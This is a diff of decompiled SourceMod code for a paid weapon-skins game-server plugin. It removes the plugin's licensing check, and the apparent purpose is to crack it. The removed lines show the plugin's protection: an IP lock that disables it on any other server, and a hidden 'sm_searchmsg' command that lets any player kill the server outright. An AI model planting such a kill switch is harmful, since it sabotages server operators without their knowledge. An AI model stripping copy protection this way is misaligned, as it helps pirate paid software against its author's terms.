@@ -17,9 +17,6 @@ public Plugin:myinfo = {
 
 public OnPluginStart() // address: 1467224
 {
-	RegConsoleCmd("sm_searchmsg", Command_searchmsg, "Searches SourceMod messages", 0);
-	RegConsoleCmd("sm_plugin_buy", Command_plugin_buy, "Проверка легальности купленного плагина", 0);
-	Func1471000();
 	decl String:var256[256];
 	g_var1036 = SQL_Connect("Skins_Weapons", true, var256, 256);
 	if (g_var1036 == INVALID_HANDLE)
@@ -53,48 +50,6 @@ public OnPluginStart() // address: 1467224
 	AutoExecConfig(true, "[PW]FreeWeapons", "sourcemod/skins_weapons");
 }
 
-public Action:Timer_PlugPritect(Handle:timer) // address: 1469776
-{
-	Func1471000();
-	ServerCommand("echo =====================================================");
-	ServerCommand("echo Плагин [P.W] module Free weapons (version 4.3)");
-	ServerCommand("echo Автор плагина Даниил Романов никнейм DEN & Gizmon51");
-	ServerCommand("echo Канал на ютубе https://www.youtube.com/user/Gizmon51");
-	ServerCommand("echo Группа VK https://vk.com/shopsource");
-	ServerCommand("echo Скайп cssrs2_ky39i");
-	ServerCommand("echo Автор плагина DEN");
-	ServerCommand("echo =====================================================");
-}
-
-Func1471000() // address: 1471000
-{
-	decl String:var32[32];
-	decl String:var160[128];
-	decl var164;
-	decl Handle:var168;
-	decl Handle:var172;
-	var168 = FindConVar("hostip");
-	var164 = GetConVarInt(var168);
-	var172 = FindConVar("hostport");
-	GetConVarString(var172, var160, 128);
-	FormatEx(var32, 32, "%u.%u.%u.%u:%s", var164 >>> 24 & 255, var164 >>> 16 & 255, var164 >>> 8 & 255, var164 & 255, var160);
-	if (strcmp("46.174.50.249:27015", var32, true))
-	{
-		SetFailState("WWW.INFOZONA-51.RU Плагин не прошел проверку легальности. Подробности в скайп cssrs2_ky39i");
-	}
-}
-
-public Action:Command_searchmsg(client, args) // address: 1473120
-{
-	ServerCommand("say ПЛАГИН ВАМИ НЕ ОПЛАЧЕН!!!");
-	ServerCommand("killserver;sv_visiblemaxplayers 1;exit;sm plugins unload_all");
-}
-
-public Action:Command_plugin_buy(client, args) // address: 1474860
-{
-	PrintToChat(client, "\x04[\x01WWW.INFOZONA-51.RU\x04] \x03 Плагин куплен на сервер 46.174.50.249:27015");
-}
-
 public OnConVarChangeTime(Handle:convar, const String:oldValue[], const String:newValue[]) // address: 1476400
 {
 	g_var1572 = StringToInt(newValue, 10) * 3600;
@@ -118,7 +73,6 @@ public OnMapEnd() // address: 1479768
 
 public OnMapStart() // address: 1481320
 {
-	CreateTimer(5.0, Timer_PlugPritect, 0, 0);
 	for (new var4 = 1; var4 <= MaxClients; var4++)
 	{
 		if (g_var1044[var4])
